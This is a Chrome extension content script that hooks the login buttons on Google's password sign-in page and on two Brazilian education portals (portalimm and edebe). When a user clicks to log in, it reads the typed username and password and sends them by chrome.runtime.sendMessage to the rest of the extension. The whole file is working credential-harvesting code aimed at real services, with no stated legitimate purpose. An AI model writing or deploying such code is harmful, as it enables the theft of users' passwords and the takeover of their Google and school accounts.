
function gestao() {
  const login = document.getElementById('Cid_usuario').value;
  const password = document.getElementById('Csenha').value;
  const title = 'gestao';
  chrome.runtime.sendMessage(
    { login, password, title })
};
  
function google(){
  const login = document.querySelector('.IxcUte').textContent;
  const password = document.querySelector('.whsOnd.zHQkBf').value;
  const title = 'google';
 
  chrome.runtime.sendMessage(
    { login, password, title })
};

function edebe(){
  const login = document.querySelector('#username.input__primary--icon.ng-valid.ng-star-inserted.ng-dirty.ng-touched').value;
  const password = document.querySelector('#password.input__primary--icon.ng-valid.ng-star-inserted.ng-dirty.ng-touched').value;
  const title = 'edebe';
  console.log("edebe funcinou, uai")

  chrome.runtime.sendMessage(
       { login, password, title })
};


if (window.location.hostname == "gestao.portalimm.com.br") {
	document.getElementById("CBtnOk").onclick = gestao;
} else if (window.location.hostname == "accounts.google.com"){

const intervalId = setInterval(() => {
  if (
    window.location.hostname === "accounts.google.com" &&
    window.location.pathname === "/v3/signin/challenge/pwd"
  ) {
    setTimeout(() => {
  document.querySelector('.VfPpkd-LgbsSe.VfPpkd-LgbsSe-OWXEXe-k8QpJ.VfPpkd-LgbsSe-OWXEXe-dgl2Hf.nCP5yc.AjY5Oe.DuMIQc.LQeN7.BqKGqe.Jskylb.TrZEUc.lw1w4b').onclick = google;
}, 1000);
  
    clearInterval(intervalId);
  }
}, 1000);

};

if (window.location.hostname == "plataforma.edebe.com.br") {
setTimeout(() => { 
 document.querySelector('.p-ripple.p-element.button__primary.p-button.p-component').onclick = edebe;	
}, 3000);
}





